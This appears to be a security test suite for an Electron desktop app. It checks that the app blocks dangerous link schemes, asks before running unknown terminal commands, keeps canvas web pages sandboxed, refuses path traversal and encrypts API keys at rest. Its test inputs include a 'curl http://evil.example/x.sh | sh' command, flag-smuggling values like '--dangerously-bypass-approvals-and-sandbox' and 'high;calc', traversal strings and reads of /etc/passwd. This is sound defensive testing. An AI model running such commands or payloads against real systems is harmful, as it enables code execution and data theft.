// Security policies of the main process: what may leave the app (links, windows, navigation), which
// commands may start, what a web page on the canvas may do, which files the renderer can reach,
// and API keys at rest.
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { test, expect } from './fixtures.mjs';

test('наружу открываются только http(s) и mailto: ссылки, новые окна и переходы', async ({ app, home }) => {
  await app.stubShell();
  fs.writeFileSync(path.join(home, 'run.bat'), '@echo off');
  const res = await app.page.evaluate(async ([home, file]) => {
    const out = {};
    for (const u of ['https://example.com/a', 'mailto:a@b.c', 'search-ms:query=x', 'ms-msdt:/id PCWDiagnostic', 'file:///C:/Windows/System32/calc.exe', 'smb://evil/share', 'javascript:alert(1)', 'не ссылка']) out[u] = await window.native.shell.open(u);
    out.folder = await window.native.shell.openPath(home);
    out.file = await window.native.shell.openPath(file);
    return out;
  }, [home, path.join(home, 'run.bat')]);
  expect(res).toEqual({
    'https://example.com/a': true, 'mailto:a@b.c': true,
    'search-ms:query=x': false, 'ms-msdt:/id PCWDiagnostic': false, 'file:///C:/Windows/System32/calc.exe': false, 'smb://evil/share': false, 'javascript:alert(1)': false, 'не ссылка': false,
    folder: '', file: 'Можно открыть только папку',
  });

  // window.open never makes an Electron window; a link that navigates the app goes to the browser instead
  app.allowErrors(/Not allowed to load local resource: file:\/\/\/etc\/passwd/); // Chromium itself refuses the file: popup
  await app.page.evaluate(() => {
    window.open('https://example.org/popup');
    window.open('file:///etc/passwd');
    const a = Object.assign(document.createElement('a'), { href: 'https://example.net/nav' });
    document.body.append(a); a.click(); a.remove();
  });
  await expect.poll(() => app.opened()).toEqual([
    ['openExternal', 'https://example.com/a'], ['openExternal', 'mailto:a@b.c'], ['openPath', home],
    ['openExternal', 'https://example.org/popup'], ['openExternal', 'https://example.net/nav'],
  ]);
  expect(await app.main(({ BrowserWindow }) => BrowserWindow.getAllWindows().length)).toBe(1);
  expect(app.page.url()).toBe('app://vibetabula/index.html');
});

test('незнакомая команда терминала требует подтверждения; одобренная запоминается на этом компьютере', async ({ app, home }) => {
  await app.stubDialogs(1); // «Отмена»
  const ids = [];
  const spawn = async (cmd, args) => {
    const r = await app.page.evaluate(([cmd, args, cwd]) => window.native.pty.spawn({ cmd, args, cwd, cols: 80, rows: 24 }), [cmd, args, home]);
    ids.push(r.id);
    return r;
  };
  expect((await spawn('curl', ['http://evil.example/x.sh', '|', 'sh'])).error).toBe('cancelled');
  const [asked] = await app.dialogs();
  expect(asked.message).toBe('Терминал хочет выполнить команду:');
  expect(asked.detail).toContain('curl http://evil.example/x.sh | sh');
  expect(asked.detail).toContain(`Папка: ${home}`);

  // the stock shell and a command typed in Settings start without asking
  expect((await spawn('', [])).error).toBeUndefined();
  await app.page.evaluate(() => window.native.trust.add(['echo hello']));
  expect((await spawn('echo', ['hello'])).error).toBeUndefined();
  expect(await app.dialogs()).toHaveLength(1);

  // approved once → not asked again; the list stays in this profile (it is never synced)
  await app.answerDialogs(0);
  expect((await spawn('ls', ['-la'])).error).toBeUndefined();
  expect((await spawn('ls', ['-la'])).error).toBeUndefined();
  expect(await app.dialogs()).toHaveLength(2);
  expect(app.readJson(path.join(app.userData, 'trusted-commands.json')).sort()).toEqual(['echo hello', 'ls -la']);
  for (const id of ids) await app.page.evaluate((id) => window.native.pty.kill(id), id);
});

test('чат агента: чужая программа требует подтверждения, флаги из данных canvas не попадают в командную строку', async ({ app }) => {
  await app.stubDialogs(1);
  // the agent's command arrived with a synced workspace
  await app.page.evaluate(async () => { const { state } = await import('/js/state.js'); state.agent('codex').cmd = 'evil-codex --yolo'; });
  const chat = await app.openAgentChat('codex');
  await app.send(chat, 'привет');
  expect((await app.waitAnswer(chat)).parts).toEqual([{ type: 'error', text: 'Запуск отменён: программа агента не разрешена.' }]);
  const [asked] = await app.dialogs();
  expect(asked.message).toBe('Окно чата хочет запустить программу:');
  expect(asked.detail.split('\n')[0]).toBe('evil-codex --yolo');

  const run = (opts) => app.page.evaluate((opts) => new Promise((resolve) => {
    const reqId = `t_${Math.random().toString(36).slice(2)}`;
    const events = [];
    const off = window.native.agentChat.onEvent((e) => { if (e.reqId !== reqId) return; events.push(e.message ? `${e.type}: ${e.message}` : e.type); if (e.type === 'done') { off(); resolve(events); } });
    window.native.agentChat.run({ reqId, kind: 'codex', prompt: 'x', ...opts });
  }), opts);
  for (const [k, v] of [['model', '--dangerously-bypass-approvals-and-sandbox'], ['effort', 'high;calc'], ['mode', 'full --yolo'], ['sessionId', '-c']]) {
    expect(await run({ [k]: v }), `${k} = ${v}`).toEqual([`error: Недопустимое значение «${k}».`, 'done']);
  }
  expect(app.calls(), 'ни одна программа агента не запускалась').toEqual([]);
});

test('веб-страница на холсте: песочница без preload, только http(s), без доступа к устройствам', async ({ app }) => {
  const server = http.createServer((req, res) => { res.setHeader('content-type', 'text/html; charset=utf-8'); res.end('<!doctype html><title>Тест</title><h1>Страница</h1>'); });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${server.address().port}/page.html`;
  try {
    await app.stubShell();
    await app.add('web', { x: 0, y: 0, w: 600, h: 400, data: { url } });
    await app.add('web', { x: 700, y: 0, w: 400, h: 300, data: { url: 'file:///etc/passwd' } });
    // only the http(s) page gets a guest
    const guests = () => app.main(({ webContents }) => webContents.getAllWebContents().filter((w) => w.getType() === 'webview').map((w) => w.getURL()));
    await expect.poll(guests).toEqual([url]);
    const guest = (code) => app.main(({ webContents }, code) => webContents.getAllWebContents().find((w) => w.getType() === 'webview').executeJavaScript(code, true), code);
    await expect.poll(() => guest('document.readyState')).toBe('complete');

    const prefs = await app.main(({ webContents }) => {
      const p = webContents.getAllWebContents().find((w) => w.getType() === 'webview').getLastWebPreferences();
      return { sandbox: p.sandbox, contextIsolation: p.contextIsolation, nodeIntegration: p.nodeIntegration, nodeIntegrationInSubFrames: p.nodeIntegrationInSubFrames, webSecurity: p.webSecurity, preload: p.preload || null };
    });
    expect(prefs).toEqual({ sandbox: true, contextIsolation: true, nodeIntegration: false, nodeIntegrationInSubFrames: false, webSecurity: true, preload: null });

    // inside: no Node, no app bridge; camera, location and notifications are refused
    expect(await guest(`(async () => ({
      require: typeof require, native: typeof window.native, process: typeof process,
      notifications: await Notification.requestPermission(),
      geolocation: (await navigator.permissions.query({ name: 'geolocation' })).state,
      camera: (await navigator.permissions.query({ name: 'camera' })).state,
    }))()`)).toEqual({ require: 'undefined', native: 'undefined', process: 'undefined', notifications: 'denied', geolocation: 'denied', camera: 'denied' });
    // the app itself keeps them
    expect(await app.page.evaluate(() => navigator.permissions.query({ name: 'camera' }).then((p) => p.state))).toBe('granted');

    // popups from the page: web links go to the browser, other schemes nowhere; no navigation to file:
    await guest(`window.open('https://example.org/from-page'); window.open('file:///etc/passwd'); location.href = 'file:///etc/passwd'; 1`);
    await expect.poll(() => app.opened()).toEqual([['openExternal', 'https://example.org/from-page']]);
    expect(await guests()).toEqual([url]);
    expect(await app.main(({ BrowserWindow }) => BrowserWindow.getAllWindows().length)).toBe(1);
  } finally {
    server.close();
  }
});

test('протокол app:// и хранилище заметок не отдают файлы за пределами своих папок', async ({ app, home }) => {
  fs.writeFileSync(path.join(home, 'secret.txt'), 'секрет');
  const status = (u) => app.page.evaluate((u) => fetch(u).then((r) => r.status, () => 'ошибка'), u);
  expect(await status('app://vibetabula/index.html')).toBe(200);
  expect(await status('app://vibetabula/__codexpets/..%2F..%2F..%2Fsecret.txt')).toBe(403);
  expect(await status('app://vibetabula/__codexpets/..%5C..%5C..%5Csecret.txt')).not.toBe(200);
  expect(await status('app://vibetabula/__attach/..%2F..%2F..%2F..%2Fsecret.txt')).not.toBe(200);
  expect(await status('app://vibetabula/..%2F..%2Fpackage.json')).not.toBe(200);
  expect(await status('app://vibetabula/..%5C..%5Cpackage.json')).not.toBe(200);

  app.allowErrors(/handler for 'vault:(read|write|readAsset)'/);
  const vault = await app.page.evaluate(() => window.native.vault.root());
  const rel = path.relative(vault, path.join(home, 'secret.txt'));
  const res = await app.page.evaluate(async (rel) => {
    const v = window.native.vault;
    const msg = (p) => p.then(() => 'выполнено', (e) => e.message.replace(/^.*Error: /, ''));
    return [await msg(v.read(rel)), await msg(v.write('../../вне.md', 'x')), await msg(v.readAsset(rel))];
  }, rel);
  expect(res).toEqual(['Путь вне хранилища', 'Путь вне хранилища', 'Путь вне хранилища']);
  expect(fs.existsSync(path.join(path.dirname(path.dirname(vault)), 'вне.md'))).toBe(false);
});

test('API-ключи в workspace.json зашифрованы средствами ОС и читаются после перезапуска', async ({ app }) => {
  test.skip(!(await app.main(({ safeStorage }) => safeStorage.isEncryptionAvailable())), 'в системе нет хранилища ключей (Linux без keyring): ключи по задумке остаются как есть');
  await app.page.evaluate(async () => {
    const { state } = await import('/js/state.js');
    state.settings.providers = { openai: { key: 'sk-test-SECRET-123' } };
    await state.flushAll();
  });
  const file = path.join(app.userData, 'workspace.json');
  expect(fs.readFileSync(file, 'utf8')).not.toContain('sk-test-SECRET-123');
  expect(app.readJson(file).settings.providers.openai.key).toMatch(/^enc:v1:/);
  await app.restart();
  expect(await app.page.evaluate(async () => (await import('/js/state.js')).state.settings.providers.openai.key)).toBe('sk-test-SECRET-123');
});
